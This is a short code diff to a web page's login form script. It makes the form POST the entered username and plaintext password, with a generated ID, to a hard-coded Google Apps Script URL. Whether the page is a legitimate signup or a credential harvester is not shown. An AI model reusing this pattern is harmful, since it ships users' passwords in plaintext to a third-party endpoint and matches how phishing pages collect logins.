@@ -132,16 +132,23 @@
       const random = Math.random().toString(36).substring(2, 8).toUpperCase();
       return prefix + random;
     }
+
     async function submitForm(event) {
       event.preventDefault();
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
       const uid = generateUID();
-      const response = await fetch("YOUR_GOOGLE_SCRIPT_URL_HERE", {
+
+      const params = new URLSearchParams();
+      params.append("username", username);
+      params.append("password", password);
+      params.append("uid", uid);
+
+      const response = await fetch("https://script.google.com/macros/s/AKfycbwjMf0oJUKcSHqK3cuxc7YcDmRBDpmhmANEciz49zqWHxb_yqXCoOjDLJL3agRwC-Pu1A/exec", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ username, password, uid })
+        body: params
       });
+
       const result = await response.text();
       if (result === "Success") {
         document.body.innerHTML = `
